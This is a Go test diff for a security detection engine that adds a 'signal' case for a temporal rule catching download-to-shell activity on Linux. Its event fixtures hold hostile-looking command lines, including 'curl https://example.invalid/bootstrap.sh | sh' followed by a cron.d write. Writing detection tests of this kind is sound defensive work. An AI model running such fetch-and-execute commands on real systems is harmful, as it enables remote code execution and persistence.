@@ -16,7 +16,7 @@ import (
 
 // 使用仓库发布的基础/时序规则走真实 Processor，而非仅用 marker 条件测内核。
 func TestRepositoryTemporalRulesPersistLateReplay(t *testing.T) {
-	for _, kind := range []string{"count", "sequence", "account"} {
+	for _, kind := range []string{"count", "sequence", "account", "signal"} {
 		t.Run(kind, func(t *testing.T) {
 			p, c, db := testProcessor(t)
 			defer c.Close()
@@ -57,6 +57,10 @@ func TestRepositoryTemporalRulesPersistLateReplay(t *testing.T) {
 					e.AssetID, e.PartitionKey, e.Username = &hosts[i%3], hosts[i%3].String(), "operator"
 					events = append(events, e)
 				}
+			} else if kind == "signal" {
+				// 两步都是信号规则：只进候选、不单独告警；共现不论先后，证据按时间排序
+				rule = "temporal:linux-download-pipe-shell"
+				events = []Envelope{makeEvent(0, 1007, `{"process":{"name":"bash","cmd_line":"bash"}}`), makeEvent(1, 1007, `{"process":{"name":"curl","file":{"path":"/usr/bin/curl"},"cmd_line":"curl -s https://example.invalid/payload.sh"}}`)}
 			} else {
 				rule = "temporal:linux-download-sensitive-file"
 				events = []Envelope{makeEvent(0, 1007, `{"process":{"name":"sh","cmd_line":"curl https://example.invalid/bootstrap.sh | sh"}}`), makeEvent(30, 1001, `{"activity_id":3,"file":{"path":"/etc/cron.d/update"}}`)}
@@ -93,6 +97,12 @@ func TestRepositoryTemporalRulesPersistLateReplay(t *testing.T) {
 			var detections int
 			if err := db.QueryRow(`SELECT count(*) FROM temporal_detections WHERE rule_id=$1`, rule).Scan(&detections); err != nil || detections != 1 {
 				t.Fatalf("重复命中: %d %v", detections, err)
+			}
+			if kind == "signal" {
+				var signalAlerts int
+				if err := db.QueryRow(`SELECT count(*) FROM alerts WHERE rule_id IN ('9fbc3a0d-eb13-4ffa-a540-e9587ecdaa18','fa68888c-1f59-4c51-8409-48c6e0614860')`).Scan(&signalAlerts); err != nil || signalAlerts != 0 {
+					t.Fatalf("信号规则单独出了告警: %d %v", signalAlerts, err)
+				}
 			}
 			// 单机五次失败只是主机规则的事；账号规则要求至少两台资产，不重复告警
 			if kind == "count" {
